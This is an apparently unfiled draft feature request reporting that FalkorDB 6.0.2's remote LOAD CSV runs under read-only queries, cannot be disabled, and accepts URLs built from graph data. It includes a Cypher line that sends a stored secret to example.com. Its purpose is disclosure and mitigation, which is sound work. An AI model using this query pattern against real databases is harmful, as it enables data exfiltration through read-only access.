# Remote `LOAD CSV` cannot be disabled and runs under `GRAPH.RO_QUERY`, with a URL built from graph data (6.0.2): feature request

Found in the M20 FalkorDB depth pass (2026-10-17). Verified on the pinned 6.0.2 digest (docs/FALKORDB_COMPAT.md, M20
section) and on a throwaway container of the same digest. Draft only: not filed.

**What happens.** Any user who may run `GRAPH.RO_QUERY` can make the engine fetch any public `https://` URL, and the URL
may be an expression over graph data, so a read-only user (or any tool that forwards raw read-only Cypher, such as an
MCP server) has an outbound channel from the engine:

```cypher
CREATE (:Secret {v: 'abc'});
// as a read-only ACL user, through GRAPH.RO_QUERY:
MATCH (s:Secret) LOAD CSV FROM 'https://example.com/?d=' + s.v AS row RETURN count(row);   // the request is made
```

- `http://` is refused; private, loopback and metadata addresses appear to be blocked (source), so this is not SSRF into a
  private network, but exfiltration to a public host works.
- There is no configuration key (like `IMPORT_FOLDER` for `file://`) and no ACL category that turns remote `LOAD CSV`
  off. `LOAD CSV` is part of a read query, so `-@write` or `+GRAPH.RO_QUERY`-only users can still run it.

**Repro of the network dependence** (`scripts/egress_check.py --docker` in Faultline): the same container on a Docker
network created with `--internal` answers `DNS resolution failed for 'example.com'` (by name) and
`Failed to fetch CSV file: io: Network is unreachable` (by IP literal `https://1.1.1.1/`); connected to the default
bridge, the same query returns its row.

**Requests.**
1. A config switch, for example `LOAD_CSV_REMOTE no` (default could stay `yes` for compatibility).
2. Or: make remote `LOAD CSV` need a separate, ACL-visible permission (a subcommand or a module command category), so
   an operator can grant read-only Cypher without network access.
3. Docs: say on the LOAD CSV page that remote loads run under `GRAPH.RO_QUERY` and that URLs may be expressions.

**Impact for Faultline:** none shipped. Our guarded text2cypher refuses `LOAD` and the read templates are linted, but
the official FalkorDB MCP server forwards raw read-only Cypher. Production therefore puts FalkorDB on an `internal: true`
Docker network (`deploy/docker-compose.prod.yml`); `tests/live/test_egress.py` checks the topology.
